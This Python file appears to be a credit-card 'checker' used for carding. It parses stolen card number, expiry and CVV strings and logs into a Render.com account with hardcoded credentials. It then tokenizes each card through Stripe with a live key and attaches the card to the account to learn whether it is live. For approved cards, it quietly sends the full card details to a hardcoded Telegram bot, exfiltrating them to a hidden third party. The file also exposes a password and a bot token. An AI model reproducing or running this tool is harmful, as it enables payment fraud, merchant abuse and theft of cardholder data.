import re, requests, string
import logging
import requests
import time
import string
import random
import asyncio
import re
import base64
import json
import sys
import urllib3
import http.client
import os



session = requests.session()
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for i in range(6))
Last = ''.join(random.choice(letters) for i in range(6))
PWD = ''.join(random.choice(letters) for i in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
def check_mk2(input):
  x = re.search(r"(?:3|4|5|6)\d{14,15}\|\d{2}\|\d{2,4}\|\d{3,4}", input)
  if x:
    card = x.group(0)

  ccn, mm, yy, cvv = card.split('|',4)
  if mm.startswith('2'):
      mm, yy = yy, mm
  if len(mm) >= 3:
      mm, yy, cvv = yy, cvv, mm
  if len(ccn) < 15 or len(ccn) > 16:
      return ('<b>Failed to parse Card</b>\nReason: Invalid Format!</b>') 



  #x = re.findall(r'\d+', input)
  #print(x)
  #ccn = x[0]
  #print(ccn)
  #mm = x[1]
  #yy = x[2]
  #cvv = x[3]
  #if mm.startswith('2'):
            #mm, yy = yy, mm
  #if len(mm) >= 3:
    #        mm, yy, cvv = yy, cvv, mm
  #if len(ccn) < 15 or len(ccn) > 16:
    #        return ('<b>Failed to parse Card</b>\n'
  #                                     '<b>Reason: Invalid Format!</b>')   
  #BIN = ccn[:6]
  
  load5 = {"operationName":"signIn","variables":{"email":"khanhemanhhai@gmail.com","password":"namkhanh61"},"query":"mutation signIn($email: String!, $password: String!) {  signIn(email: $email, password: $password) {    ...authResultFields    __typename  }}fragment authResultFields on AuthResult {  idToken  user {    ...userFields    sudoModeExpiresAt    __typename  }  __typename}fragment userFields on User {  id  active  createdAt  email  featureFlags  githubId  gitlabId  name  notifyOnFail  notifyOnPrUpdate  otpEnabled  passwordExists  tosAcceptedAt  intercomHMAC  __typename}"}

  header = {
            "accept": "*/*",
            "user-agent": UA,
            "content-type": "application/json"
            
            
        }
  time1 = time.time()
  rz = session.post('https://api.render.com/graphql',
                          json=load5, headers=header)
        
  jsne = rz.json()
        
  tokenn = jsne['data']['signIn']['idToken']
    
      
  headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

  b = session.get('https://ip.seeip.org/').text

  s = session.post('https://m.stripe.com/6', headers=headers)
  r = s.json()
  Guid = r['guid']
  Muid = r['muid']
  Sid = r['sid']

        # hmm
  load = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_Jv30CQQpAQyWO9FMp3i5IPOt",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

  header = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UA,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
            
        }

  rx = session.post('https://api.stripe.com/v1/tokens',
                          data=load, headers=header)
  res = rx.json() 
        
  time2 = time.time()
       
        
  LastF = f'************{ccn[-4:]}'
  if 'invalid_' in rx.text:
          msg = res['error']['message']
          return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ERROR
<b>MSG</b>➟ {msg}
================================================================
================================================================
<b>PROXY-IP</b> <code>{b}</code>

''')
  if 'incorrect_number' in rx.text:
          msg = res['error']['message']
          return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ ERROR
<b>MSG</b>➟ {msg}
================================================================
================================================================
<b>PROXY-IP</b> <code>{b}</code>

''')
  if 'declined' in rx.text:
            
            msg = res['error']['message']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)


''')
  if 'incorrect_number' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Incorrect_number
<b>MSG</b>➟ Your card number is incorrect.
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)

''')
  if 'Request rate limit exceeded.' in rx.text:
            res = rx.json()
            msg = res['error']['message']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Request rate limit exceeded.
<b>MSG</b>➟ {msg}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)

''')

  if 'API Key provided' in rx.text:
            res = rx.json()
            msg = res['error'][0]['message']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ API Key provided
<b>MSG</b>➟ {msg}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)

''')
            res = rx.json()
            msg = res['error']['message']
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Security code is invalid.
<b>MSG</b>➟ {msg}
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time2 - time1:0.2f}</code>(s)

''')

  else: 
          token =res['id']
          card = res['card']
          country = card['country']
          brand = card['brand']
          funding = card['funding']
          last4 = card['last4']
          

          payload = {"operationName":"updateCard","variables":{"id":"usr-cbotlpk41lscvckv4cj0","token":token,"brand":brand,"last4":last4,"country":"US","region":"NY"},"query":"mutation updateCard($id: String!, $token: String!, $brand: String!, $last4: String!, $country: String!, $region: String!) {\n  updateCard(\n    id: $id\n    token: $token\n    brand: $brand\n    last4: $last4\n    country: $country\n    region: $region\n  ) {\n    ...ownerFields\n    ...ownerBillingFields\n    __typename\n  }\n}\n\nfragment ownerBillingFields on Owner {\n  cardBrand\n  cardLast4\n  __typename\n}\n\nfragment ownerFields on Owner {\n  id\n  billingStatus\n  email\n  featureFlags\n  notEligibleFeatureFlags\n  notifyOnFail\n  slackConnected\n  logEndpoint {\n    endpoint\n    token\n    updatedAt\n    __typename\n  }\n  __typename\n}\n"}
                    
          head = {
            "authorization": "Bearer "+tokenn
           
            
        }

          ri = requests.post('https://api.render.com/graphql', json=payload,
                          headers=head)
          res1 = ri.json() 
         
          
          time3 = time.time()
          if ',"billingStatus":"ACTIVE' in ri.text:
            msgg = res1['data']['updateCard']['billingStatus']
            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text=Render:'+ccn+'|'+mm+'|'+yy+'|'+cvv+'')
            return (f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>MSG</b>➟ {msgg}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

          if 'incorrect_cvc' in ri.text:
            return (f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {ri.text}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

          if 'errors' in ri.text:
            msg = res1['errors'][0]['message']
            #msg = res1['errors']['message']
            
            return (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>MSG</b>➟ {msg}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')

          (f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {ri.text}
================================================================
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
================================================================
<b>PROXY-IP</b> <code>{b}</code>
<b>TOOK:</b> <code>{time3 - time1:0.2f}</code>(s)

''')